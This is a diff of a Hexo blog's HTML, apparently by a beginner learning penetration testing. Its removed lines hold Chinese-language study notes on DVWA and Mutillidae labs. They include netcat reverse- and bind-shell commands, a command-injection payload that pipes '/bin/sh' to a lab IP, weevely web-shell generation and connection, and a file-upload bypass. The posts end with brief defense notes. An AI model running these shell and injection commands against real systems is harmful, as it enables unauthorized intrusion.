@@ -4,14 +4,19 @@
   <meta charset="utf-8">
   
   
-  <title>Hexo</title>
+  <title>2023.6.13 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="在B站上学了学Shodan，觉得挺好玩的，以后学学Python搞一搞。另外在安卓Termux上找到了两个工具： RED_HAWK一款PHP开发的多合一型渗透工具 功能挺全的，信息搜集，SQL漏扫，爬虫等等。 就是有点慢  使用方法：cd RED_HAWK php rhawk.php  Slowloris一款低带宽的HTTP DOS工具  使用方法：cd slowloris python slowl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023.6.13">
+<meta property="og:url" content="http://example.com/2023/06/14/2023-6-13/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="在B站上学了学Shodan，觉得挺好玩的，以后学学Python搞一搞。另外在安卓Termux上找到了两个工具： RED_HAWK一款PHP开发的多合一型渗透工具 功能挺全的，信息搜集，SQL漏扫，爬虫等等。 就是有点慢  使用方法：cd RED_HAWK php rhawk.php  Slowloris一款低带宽的HTTP DOS工具  使用方法：cd slowloris python slowl">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-14T06:09:07.000Z">
+<meta property="article:modified_time" content="2023-06-14T06:20:43.030Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Shodan">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -71,9 +76,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-2023-6-13" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-2023-6-13" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/06/14/2023-6-13/" class="article-date">
   <time class="dt-published" datetime="2023-06-14T06:09:07.000Z" itemprop="datePublished">2023-06-14</time>
@@ -86,8 +89,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/14/2023-6-13/">2023.6.13</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      2023.6.13
     </h1>
   
 
@@ -265,148 +268,19 @@ with open(&quot;ip_target.txt&quot;,&quot;r&quot;) as f:
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-2023-6-12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/06/12/2023-6-12/" class="article-date">
-  <time class="dt-published" datetime="2023-06-12T12:11:17.000Z" itemprop="datePublished">2023-06-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/12/2023-6-12/">2023/6/12</a>
-    </h1>
+    <a href="/2023/06/12/2023-6-12/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2023/6/12</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>可能是阴天的原因，今天睡了12h,</p>
-<p>搞了半天netcat也没成功。</p>
-<p>以下是学的内容：</p>
-<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><pre><code>允许攻击者执行操作系统的命令
-Windows或Linux命令
-可以执行反弹shell
-或者使用wget命令上传任何文件
-资源中附加的代码执行命令
-</code></pre>
-<p>ping baidu.com;dir</p>
-<p>Linux 可以<br>Windows 不可以</p>
-<p>ping baidu.com | dir</p>
-<p>都可以</p>
-<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p>服务器IP 10.20.14.203</p>
-<p>nc -vv -l -p 8080</p>
-<p>在kali上：</p>
-<p>nc -e &#x2F;bin&#x2F;sh 10.20.14.203 8080</p>
-<p>DVWA:</p>
-<p>10.20.14.203;nc -e &#x2F;bin&#x2F;sh 10.20.14.203 8080</p>
-<h2 id="nc用法"><a href="#nc用法" class="headerlink" title="nc用法"></a>nc用法</h2><p>示意图：<br><img src="/img/nc%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="nc示意图" title="NC"></p>
-<h3 id="建立一个简单的通信系统"><a href="#建立一个简单的通信系统" class="headerlink" title="建立一个简单的通信系统"></a>建立一个简单的通信系统</h3><pre><code>创建一个服务端方法(这里用Windows192.168.232.135)
-nc64.exe -l -p 4444
-创建一个客户端方法
-nc 服务器IP 4444
-这里实现了一个简单的通信系统，但并不能对服务器命令执行
-</code></pre>
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><pre><code>-l 开启监听模式
--p 监听端口号
-</code></pre>
-<h3 id="返回shell的使用"><a href="#返回shell的使用" class="headerlink" title="返回shell的使用"></a>返回shell的使用</h3><pre><code>创建一个服务端方法
-    nc64.exe -l -p 4444 -e cmd.exe
-创建一个客户端方法（连接服务端）
-    nc 192.168.232.135 4444
-能对机器进行命令执行
-</code></pre>
-<p>这netcat试了半天都失败了，端口开了，防火墙关了，ping通了，无语了。</p>
-<h2 id="代码执行漏洞的防御方法"><a href="#代码执行漏洞的防御方法" class="headerlink" title="代码执行漏洞的防御方法"></a>代码执行漏洞的防御方法</h2><pre><code>在服务器上尽量避免使用危险的应用
-在命令执行之前对用户输入的命令进行过滤
-</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/06/12/2023-6-12/" data-id="clivbpz6a0004aggjevtwfvxh" data-title="2023/6/12" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code-execution/" rel="tag">code execution</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
-
-
-
-  
-    <article id="post-The-first-day" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/06/11/The-first-day/" class="article-date">
-  <time class="dt-published" datetime="2023-06-11T10:27:05.000Z" itemprop="datePublished">2023-06-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/11/The-first-day/">The first day</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="这是我的第一篇博客，简单说一下今天学的东西。"><a href="#这是我的第一篇博客，简单说一下今天学的东西。" class="headerlink" title="这是我的第一篇博客，简单说一下今天学的东西。"></a>这是我的第一篇博客，简单说一下今天学的东西。</h1><h2 id="学习网站："><a href="#学习网站：" class="headerlink" title="学习网站："></a>学习网站：</h2><p><a target="_blank" rel="noopener" href="https://zsecurity.org/">https://zsecurity.org/</a></p>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>ping domain &#x2F;&#x2F;查IP</p>
-<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><a target="_blank" rel="noopener" href="https://whois.domaintools.com/">https://whois.domaintools.com/</a></p>
-<h3 id="查web应用，进而利用漏洞"><a href="#查web应用，进而利用漏洞" class="headerlink" title="查web应用，进而利用漏洞"></a>查web应用，进而利用漏洞</h3><p><a target="_blank" rel="noopener" href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p>
-<h3 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h3><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
-<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><a target="_blank" rel="noopener" href="https://www.robtex.com/">https://www.robtex.com/</a></p>
-<h3 id="反向查找，根据IP查域名"><a href="#反向查找，根据IP查域名" class="headerlink" title="反向查找，根据IP查域名"></a>反向查找，根据IP查域名</h3><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>knockpy用不了<br>御剑<br>站长之家</p>
-<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>mutillidae<br>全是漏洞的web应用</p>
-<h3 id="爆破网站目录"><a href="#爆破网站目录" class="headerlink" title="爆破网站目录"></a>爆破网站目录</h3><p>dirb<br>用法：drib <a target="_blank" rel="noopener" href="http://10.20.14.204/mutillidae/">http://10.20.14.204/mutillidae/</a><br>phpinfo.php<br>robots.txt</p>
-<h3 id="maltego发现服务器，域名和文件，网站，托管服务提供商和电子邮件"><a href="#maltego发现服务器，域名和文件，网站，托管服务提供商和电子邮件" class="headerlink" title="maltego发现服务器，域名和文件，网站，托管服务提供商和电子邮件"></a>maltego发现服务器，域名和文件，网站，托管服务提供商和电子邮件</h3><p>这个东西非常牛逼</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>weevly<br>weevely generate 123 &#x2F;home&#x2F;bcy&#x2F;桌面&#x2F;shell.php<br>weevely <a target="_blank" rel="noopener" href="http://192.168.1.4/dvwa/hackable/uploads/shell.php">http://192.168.1.4/dvwa/vulnerabilities/upload/../../hackable/uploads/shell.php</a> 123</p>
-<p>这逼养的全是乱码还连不上<br>建议使用中国菜刀</p>
-<h3 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h3><p>GET:能看到传入值<br>POST：</p>
-<h3 id="拦截HTTP请求"><a href="#拦截HTTP请求" class="headerlink" title="拦截HTTP请求"></a>拦截HTTP请求</h3><p>burpsuit</p>
-<p>shell.php.jpg</p>
-<h3 id="文件上传漏洞的防御："><a href="#文件上传漏洞的防御：" class="headerlink" title="文件上传漏洞的防御："></a>文件上传漏洞的防御：</h3><pre><code>1. 永远不允许人们上传可执行文件，执行黑白名单策略
-2. 检查文件类型和文件拓展名 
-3. 对用户上传的文件进行格式转换
-</code></pre>
-<p><img src="/img/upload.jpg" alt="最后来张CSDN学到的文件上传的总结" title="upload"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/06/11/The-first-day/" data-id="clivbpz6a0003aggj2ixiaymk" data-title="The first day" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
 </section>
